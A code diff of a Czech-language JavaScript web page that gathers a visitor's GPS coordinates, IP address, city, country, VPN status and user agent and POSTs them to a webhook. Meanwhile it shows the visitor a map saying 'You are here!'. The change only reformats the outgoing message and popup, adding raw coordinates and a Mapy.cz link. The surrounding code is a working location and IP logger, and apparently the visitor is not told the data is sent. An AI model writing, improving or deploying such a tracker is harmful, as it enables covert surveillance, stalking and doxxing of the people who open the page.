@@ -35,11 +35,12 @@
     }
 
     function sendLocationToWebhook(latitude, longitude, ipInfo, userAgent) {
-        const mapyCzURL = `https://mapy.cz/zakladni?x=${longitude}&y=${latitude}&z=15`;
+        const mapyCzURL = `https://en.mapy.cz/zakladni?x=${longitude}&y=${latitude}&z=15&source=coor&id=${longitude},${latitude}`;
         const message = `📱 **Zařízení:** ${userAgent}
 🌍 **IP Adresa:** ${ipInfo.ip} (Město: ${ipInfo.city}, Země: ${ipInfo.country})
 🌐 **VPN:** ${ipInfo.vpn}
-📍 **GPS Lokace:** [Otevřít na Mapy.cz](${mapyCzURL})`;
+📍 **GPS Souřadnice:** ${latitude}, ${longitude}
+🔗 **Mapa:** [Zobrazit na Mapy.cz](${mapyCzURL})`;
 
         fetch(webhookURL, {
             method: "POST",
@@ -62,7 +63,7 @@
         }).addTo(map);
 
         L.marker([latitude, longitude]).addTo(map)
-            .bindPopup("Tady jsi!")
+            .bindPopup(`Tady jsi! 📍\nLat: ${latitude}, Lon: ${longitude}`)
             .openPopup();
 
         // Odeslat data na webhook
